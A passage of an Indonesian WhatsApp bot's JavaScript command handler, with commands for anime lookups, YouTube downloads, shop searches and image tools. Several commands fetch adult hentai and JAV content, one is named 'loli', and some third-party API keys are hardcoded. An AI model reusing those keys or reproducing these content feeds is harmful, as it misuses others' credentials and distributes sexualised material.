             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${setting.lolkey}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Id : ${get_result.id}\n`
             ini_txt += `Id MAL : ${get_result.idMal}\n`
             ini_txt += `Title : ${get_result.title.romaji}\n`
             ini_txt += `English : ${get_result.title.english}\n`
             ini_txt += `Native : ${get_result.title.native}\n`
             ini_txt += `Format : ${get_result.format}\n`
             ini_txt += `Episodes : ${get_result.episodes}\n`
             ini_txt += `Duration : ${get_result.duration} mins.\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Season : ${get_result.season}\n`
             ini_txt += `Season Year : ${get_result.seasonYear}\n`
             ini_txt += `Source : ${get_result.source}\n`
             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
             ini_txt += `Score : ${get_result.averageScore}%\n`
             ini_txt += `Characters : \n`
             ini_character = get_result.characters.nodes
             for (var x of ini_character) {
             ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
             ini_txt += `\nDescription : ${get_result.description}`
             thumbnail = await getBuffer(get_result.coverImage.large)
             await dimas.sendMessage(from, thumbnail, image, { quoted: dim, caption: ini_txt })
             break
      case 'kusonime':
             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             reply(mess.wait)
             query = args.join(" ")
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${setting.lolkey}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Title : ${get_result.title}\n`
             ini_txt += `Japanese : ${get_result.japanese}\n`
             ini_txt += `Genre : ${get_result.genre}\n`
             ini_txt += `Seasons : ${get_result.seasons}\n`
             ini_txt += `Producers : ${get_result.producers}\n`
             ini_txt += `Type : ${get_result.type}\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Total Episode : ${get_result.total_episode}\n`
             ini_txt += `Score : ${get_result.score}\n`
             ini_txt += `Duration : ${get_result.duration}\n`
             ini_txt += `Released On : ${get_result.released_on}\n`
             ini_txt += `Desc : ${get_result.desc}\n`
             link_dl = get_result.link_dl
             for (var x in link_dl) {
             ini_txt += `\n${x}\n`
             for (var y in link_dl[x]) {
             ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
             ini_buffer = await getBuffer(get_result.thumbnail)
             await dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: ini_txt })
             break
       case 'otakudesu':
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
              ini_txt += `Judul : ${get_result.judul}\n`
              ini_txt += `Type : ${get_result.type}\n`
              ini_txt += `Episode : ${get_result.episodes}\n`
              ini_txt += `Aired : ${get_result.aired}\n`
              ini_txt += `Producers : ${get_result.producers}\n`
              ini_txt += `Genre : ${get_result.genres}\n`
              ini_txt += `Duration : ${get_result.duration}\n`
              ini_txt += `Studios : ${get_result.status}\n`
              ini_txt += `Rating : ${get_result.rating}\n`
              ini_txt += `Credit : ${get_result.credit}\n`
              get_link = get_result.link_dl
              for (var x in get_link) {
              ini_txt += `\n\n*${get_link[x].title}*\n`
              for (var y in get_link[x].link_dl) {
              ini_info = get_link[x].link_dl[y]
              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
              ini_txt += `\`\`\`Link : \`\`\`\n`
              down_link = ini_info.link_dl
              for (var z in down_link) {
              ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
              reply(ini_txt)
              break
       case 'nekopoi':
              if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
              ini_url = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${setting.lolkey}&url=${ini_url}`)
              get_result = get_result.result
              ini_txt = `\`\`\`▢ Title : ${get_result.anime}\`\`\`\n`
              ini_txt += `\`\`\`▢ Porducers : ${get_result.producers}\`\`\`\n`
              ini_txt += `\`\`\`▢ Duration : ${get_result.duration}\`\`\`\n`
              ini_txt += `\`\`\`▢ Size : ${get_result.size}\`\`\`\n`
              ini_txt += `\`\`\`▢ Sinopsis : ${get_result.sinopsis}\`\`\`\n`
              link = get_result.link
              for (var x in link) {
              ini_txt += `\n${link[x].name}\n`
              link_dl = link[x].link
              for (var y in link_dl) {
              ini_txt += `${y} - ${link_dl[y]}\n`
}
}
              buff = await getBuffer(get_result.thumb)
              
               buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: ini_txt,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
         break
       case 'nekopoisearch':
              if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = ""
              for (var x of get_result) {
              ini_txt += `\`\`\`▢ Title : ${x.title}\`\`\`\n`
              ini_txt += `\`\`\`▢ Link : ${x.link}\`\`\`\n`
              ini_txt += `\`\`\`▢ Thumbnail : ${x.thumbnail}\`\`\`\n\n`
}
              reply(ini_txt)
              break
       case 'neko':
       case 'kanna':
       case 'sagiri':
       case 'megumin':
       case 'wallnime':
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
    
              break
       
       case 'hentai':
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${setting.lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
    
              break
       case 'nakanoitsuki':
       case 'nakanodimas':
       case 'nakanomiku':
              reply(mess.wait)
              res = await axios.get(`https://fdciabdul.tech/api/pinterest?keyword=${command}`)
              var string = JSON.parse(JSON.stringify(res.data))
              var random =  string[Math.floor(Math.random() * string.length)]
              sendFileFromUrl(random, image, {quoted: dim, thumbnail: Buffer.alloc(0), caption: `*Wangy²*`})
              break
       case 'storyanime':
              
              reply(mess.wait)
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${setting.lolkey}`)
              buffer = await getBuffer(anu.result)
              dimas.sendMessage(from, buffer, video, { quoted: dim })
              break
       case 'nekopoi3d':
       case '3dnekopoi':
       case '3dnekopoilast':
              reply(mess.wait)
              try {
              bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${setting.vhtearkey}`)
              bsangee2 = bsangee.data
              keluarplay = `*List update 3D JAV*\n`
              for (let i = 0; i < bsangee2.result.length; i++) {
              keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
}
              reply(keluarplay) 
              } catch (err) {
              console.log(err)
              reply('error!')
}
               break
        case 'nekopoijav':
        case 'javnekopoi':
               reply(mess.wait)
               try {
               bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${setting.vhtearkey}`)
               bsangce2 = bsangce.data
               keluarplay = `*List update JAV*\n`
               for (let i = 0; i < bsangce2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
}
               reply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'nekopoicosplay':
        case 'cosplaynekopoi':
               try {
               reply(mess.wait)
               bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${setting.vhtearkey}`)
               bsangbe2 = bsangbe.data
               keluarplay = `*List update Cosplay JAV*\n`
               for (let i = 0; i < bsangbe2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
}
               reply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'otakuongoing':              
               o = await onGoing()
               console.log(o)
               ot = '*「 Ongoing Otakudesu 」*'
               for (let i = 0; i < o.length; i++) {
               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
}
               buff = await getBuffer(o[0].thumb)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
    break
            case 'waifu':
            
v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
buff = sendMediaURL(from, v.url, )
  buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
    
break
       
       case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dimas-chan02.github.io`)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = ( await dimas.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
        case 'playy':
case 'lagu':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
/////////////sendFileFromUrl(res.all[0].image, image, {quoted: dim, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: dim, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botName}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: dim, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: dim, mimetype: 'audio/mp3', filename: res[0].output})
}
break
/*case 'play2':   
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=apivinz`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				dimas.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})
					break  */
                    case 'play1':
try {
reply('Loading....')
let yut = await yts(q)
ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${lol}&query=${q}`)
                ini_url = ini_url.result
                buff = await getBuffer(ini_url)
                ytv(yut.videos[0].url)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 40000) return sendMediaURL(from, buff, `*P L A Y  M P 4*\n\n • Judul : ${title}\n • Size : ${filesizeF}\n • Upload : ${yut.videos[0].ago}\n • Ditonton : ${yut.videos[0].views}\n • Duration : ${yut.videos[0].timestamp}\n • Link : ${a.data}\n\n_Ukuran File Terlalu besar, anda bisa download sendiri lewat Link Diatas!!_\n\n\n\nFOTO DI ATAS CUMAN THUMBNAIL>//<`)
                       
const mp4 = `
*PLAY VIDEO\n\n Judul : ${title}\n\n Size : ${filesizeF}\n\n Upload : ${yut.videos[0].ago}\n\n Ditonton : ${yut.videos[0].views}\n\n Duration : ${yut.videos[0].timestamp}\n\n Url : ${yut.videos[0].url}`
//sendMediaURL(from, thumb, mp4)
sendMediaURL(from, dl_link, mp4)
//limitAdd(sender, limit)
})
})
.catch((err) => reply(`${err}`))
} catch (err) {
sendMess(ownerNumber, 'PlayMp4 Error : ' + err)
console.log(color('[PlayMp4]', 'red'), err)
reply(mess.error)
}
break
case 'play2':
	if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                             // if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              if (!q) return reply('Linknya?')
             res = await yts(q)
               let playyy = `
*Hai ${pushname} >//<*

*Number:${[sender]}*

*Youtube Download*
 *Judul :* ${res.all[0].title}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}
*Silahkan pilih media yang akan di download*
`
tplay = await getBuffer(res.all[0].image)
//> let tod = fs.readFileSync('./media/Nakano.jpg')
                    dimas.sendMessage(from, { contentText: playyy, footerText: 'Silahkan pilih 🎥VIDEO atau 🎵AUDIO\n\nJika button tidak resfon silahkan pakai #play2', buttons: [{ buttonId: `!play1 ${q}`, buttonText: { displayText: '🎥VIDEO' }, type: 1 },{ buttonId: `!playy ${q}`, buttonText: { displayText: '🎵AUDIO' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: tplay, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage', { quoted: dim})	
                    break			
					case 'ytdl':
					case 'play':
			  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dimas-chan02.github.io`)
                     if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                              //if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              if (!q) return reply('Linknya?')
			 res = await yts(q)
			   let thumbInfo = ` 
▢ *Youtube Download*
▢ *Judul :* ${res.all[0].title}
▢ *ID Video :* ${res.all[0].videoId}
▢ *Diupload Pada :* ${res.all[0].ago}
▢ *Views :* ${res.all[0].views}
▢ *Durasi :* ${res.all[0].timestamp}
▢ *Channel :* ${res.all[0].author.name}
▢ *Link Channel :* ${res.all[0].author.url}

*Silahkan pilih media yang akan di download*
`
buttons = [{buttonId:`${prefix}play1 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]

imageMessage = (await dimas.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}

prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{})

dimas.relayWAMessage(prep)
break
					
          case 'lirik':
                 if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${lol}&query=${query}`)
                    reply(get_result.result)
                    
               break
         case 'pinterest':
                if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                         if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

            //if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:freply})
		   if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                 reply (mess.wait)
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${setting.lolkey}&query=${query}`)
                    ini_url = ini_url.result
                    buff = await getBuffer(ini_url)
                    buttons = [{buttonId: `${prefix + command} ${query}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        break
        case 'shopee':
               try {
               if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               reply(mess.wait)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE* 
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`▢ Nama : ${get_data[i].name}\`\`\`
\`\`\`▢ Harga : ${get_data[i].harga}\`\`\`
\`\`\`▢ Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`▢ Lokasi : ${get_data[i].location}\`\`\`
\`\`\`▢ Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`▢ Stok : ${get_data[i].stock}\`\`\`
\`\`\`▢ Informasi : ${get_data[i].information}\`\`\`
\`\`\`▢ Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: teks })
              } catch {
              reply(`Maaf produk ${query} tidak ditemukan`)
}
              break
       case 'playstore':
              try {
              if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_result.length; i++) {
teks += `\`\`\`▢ Title : ${get_result[i].title}\`\`\`
\`\`\`▢ Harga : ${get_result[i].price}\`\`\`
\`\`\`▢ Rate : ${get_result[i].rating}\`\`\`
\`\`\`▢ Link : ${get_result[i].url}\`\`\`

`
}
              ini_buffer = await getBuffer(get_result[0].thumb)
              dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: teks })
              } catch {
              reply(`Maaf aplikasi ${query} tidak ditemukan`)
}
              break
       case 'yts':
       case 'ytsearch':
              if (!q) return reply(mess.wrongFormat)
              reply(mess.wait)
              try {
              res = await yts(q)
              a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for (let i of res.all) {
a += `\`\`\`▢ Title : ${i.title}\`\`\`
\`\`\`▢ Views : ${i.views}\`\`\`
\`\`\`▢ Upload : ${i.ago}\`\`\`
\`\`\`▢ Durasi : ${i.timestamp}\`\`\`
\`\`\`▢ Channel : ${i.author.name}\`\`\`
\`\`\`▢ Link : ${i.url}\`\`\``
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: dim, caption: b})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
               case 'tahta':
                    buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${q}&apikey=IkyOgiwara`)
              buttons = [{buttonId: `!infoig`,buttonText:{displayText: ` Follow @dimas_ads`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'crated by iky ads', imageMessage: imageMsg,
              contentText:`Follow @Dimas Edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
              break
              case 'quotemaker':
                    buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/quote-maker?text=${q}&apikey=IkyOgiwara`)
                    dimas.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), quoted: freply})
                    break
       case 'tourl':
               if ((isMedia && !dim.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
               owgi = await dimas.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('kirim/reply gambar/video')
}
               break

       case 'imgtourl':
       case 'img2url':
               reply(mess.wait) 
               var imgbb = require('imgbb-uploader')
               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
               var media = await  dimas.downloadAndSaveMediaMessage(encmedia)       
               imgbb('39d895963468b814fad0514bd28787e2', media)
              .then(data => {
               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(media)
               dimas.sendMessage(from, ibb, image, { quoted: dim, caption: caps})
})
              .catch(err => {
               throw err
})
               break
               case 'removebg':

    var imgbb = require('imgbb-uploader')
    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
      ted = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: dim
      reply('Wait...')
      owgi = await dimas.downloadAndSaveMediaMessage(ted)
      anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
      hehe = await getBuffer(`http://api.lolhuman.xyz/api/removebg?apikey=${lol}&img=${anu.display_url}`)
     dimas.sendMessage(from, hehe, image, {quoted:freply})
    } else {
      reply('Jangan tambah kan apapun pada command')
    }
    break
         case 'asupan': // shansekai                
               if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
               reply(mess.wait)
               asupan()
              .then(async (body) => {
               asupann = body.split('\n')
               asupanx = asupann[Math.floor(Math.random() * asupann.length)]
               sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.')
               console.log('Success sending video!')
})
              .catch(async (err) => {
               console.log(err)
               reply(`${err}`)
})
               break
        case 'nulis':
        case 'tulis':
               if (args.length < 1) return reply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               dimas.sendMessage(from, buff, image, {quoted: dim, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break
                case 'nulishelp':
                reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
                break
            case 'nuliskiri':{
                
                if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/nulis/images/buku/sebelumkiri.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    dimas.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    
                })
            }
                break
            case 'nuliskanan':{
                
                if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                reply(mess.wait)
                const tulisan = body.slice(12)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/nulis/images/buku/sebelumkanan.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+128+129',
                    fixHeight,
                    './media/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    dimas.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    
                })
            }
                break
            case 'foliokiri':{
                
                if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                    './media/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '1720x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '4',
                    '-annotate',
                    '+48+185',
                    fixHeight,
                    './media/nulis/images/folio/setelahkiri.jpg'
